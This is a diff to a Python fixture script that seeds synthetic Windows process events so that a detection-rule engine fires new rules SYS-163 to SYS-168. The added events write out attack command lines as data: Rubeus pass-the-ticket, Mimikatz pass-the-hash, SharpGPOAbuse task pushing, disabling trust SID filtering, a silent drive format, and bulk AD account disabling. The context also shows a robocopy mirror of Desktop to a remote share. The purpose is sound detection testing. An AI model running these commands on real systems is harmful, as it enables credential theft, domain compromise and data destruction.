@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 115 rules
+job: it is a regression fixture and a coverage demo, built to fire all 121 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
 19, 21) added purely so the incident's raw event stream and process tree show
@@ -91,6 +91,10 @@ machine. The phases, roughly in kill-chain order:
       │   dead-drop as web-service C2 channels, a broad Documents archive,
       │   and a robocopy mass-mirror of Desktop to a remote share
       │   (SYS-159 through SYS-162)
+      ├─ coverage-expansion pass 8: Rubeus pass-the-ticket, Mimikatz
+      │   sekurlsa::pth/kerberos::ptt, SharpGPOAbuse, netdom trust with SID
+      │   filtering disabled, a silent format /y, and a bulk
+      │   Get-ADUser | Disable-ADAccount one-liner (SYS-163 through SYS-168)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
       ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
@@ -134,7 +138,8 @@ EXPECTED_RULES = {
     "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
     "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
     "SYS-153", "SYS-154", "SYS-155", "SYS-156", "SYS-157", "SYS-158", "SYS-159",
-    "SYS-160", "SYS-161", "SYS-162",
+    "SYS-160", "SYS-161", "SYS-162", "SYS-163", "SYS-164", "SYS-165", "SYS-166",
+    "SYS-167", "SYS-168",
 }
 
 
@@ -274,6 +279,13 @@ G = {
     "paste_dropoff": "{rng-paste-dropoff}",
     "archive_staging": "{rng-archive-staging}",
     "robocopy_staging": "{rng-robocopy-staging}",
+    # Coverage-expansion pass 8: AD-specific gaps (SYS-163..168).
+    "rubeus_ptt": "{rng-rubeus-ptt}",
+    "mimikatz_pth": "{rng-mimikatz-pth}",
+    "gpo_abuse": "{rng-gpo-abuse}",
+    "trust_sidhistory": "{rng-trust-sidhistory}",
+    "destructive_wipe": "{rng-destructive-wipe}",
+    "bulk_disable": "{rng-bulk-disable}",
 }
 
 
@@ -899,6 +911,52 @@ def events() -> list[dict]:
                     r"robocopy.exe C:\Users\redteam.ops\Desktop "
                     r"\\45.132.192.68\share\loot /MIR",
                     pid=5660, ppid=4510))
+
+    # === Coverage-expansion pass 8: AD-specific gaps, off "ops" ===
+    # Rubeus used to pass a stolen ticket rather than to Kerberoast --
+    # deliberately also satisfies SYS-118's generic rubeus.exe catch-all
+    # (SYS-163).
+    ev.append(proc(step(1), G["rubeus_ptt"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
+                    r"Rubeus.exe ptt /ticket:C:\Users\redteam.ops\AppData\Local\Temp\ticket.kirbi",
+                    pid=5670, ppid=4510, integrity="High"))
+
+    # Mimikatz pass-the-hash -- deliberately also satisfies SYS-131's
+    # generic Mimikatz module-signature catch-all (SYS-164).
+    ev.append(proc(step(1), G["mimikatz_pth"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
+                    r'mimikatz.exe "sekurlsa::pth /user:svc_backup /domain:corp.local '
+                    r'/ntlm:aad3b435b51404eeaad3b435b51404ee"',
+                    pid=5680, ppid=4510, integrity="High"))
+
+    # SharpGPOAbuse pushing an immediate scheduled task through a GPO
+    # (SYS-165).
+    ev.append(proc(step(1), G["gpo_abuse"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\SharpGPOAbuse.exe",
+                    r'SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" '
+                    r'--Author "CORP\redteam.ops" --Command "cmd.exe" '
+                    r'--Arguments "/c calc.exe" --GPOName "Default Domain Policy"',
+                    pid=5690, ppid=4510, integrity="High"))
+
+    # netdom disables SID-filtering protection on an existing domain trust
+    # (SYS-166).
+    ev.append(proc(step(1), G["trust_sidhistory"], G["ops"], r"C:\Windows\System32\netdom.exe",
+                    "netdom.exe trust corp.local /domain:partner.local "
+                    "/EnableSIDHistory:yes /quarantine:no", pid=5700, ppid=4510,
+                    integrity="High"))
+
+    # Silent unattended format /y against a drive letter -- destruction as
+    # the goal itself, not a side effect of covering tracks (SYS-167).
+    ev.append(proc(step(1), G["destructive_wipe"], G["ops"], r"C:\Windows\System32\format.com",
+                    "format.com D: /y /q", pid=5710, ppid=4510, integrity="High"))
+
+    # Bulk Get-ADUser -Filter piped into Disable-ADAccount -- mass account
+    # lockout as a ransomware closing move (SYS-168).
+    ev.append(proc(step(1), G["bulk_disable"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -nop -c \"Get-ADUser -Filter 'Enabled -eq $true' "
+                    r"| Disable-ADAccount\"",
+                    pid=5720, ppid=4510))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
